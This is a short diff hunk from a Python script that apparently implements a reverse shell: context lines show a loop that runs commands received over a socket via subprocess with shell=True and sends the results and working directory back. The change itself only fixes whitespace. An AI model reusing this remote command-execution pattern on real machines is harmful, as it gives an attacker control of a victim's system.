@@ -52,7 +52,7 @@ while True:
         rev_socket.send(hex_handler(os.getcwd() + '>', encode=True))
         continue
 
-    output = subprocess.Popen(command, shell=True, stdout = subprocess.PIPE, stderr=subprocess.PIPE)
+    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     try:
         stdout = output.stdout.read().decode()
     except UnicodeDecodeError:
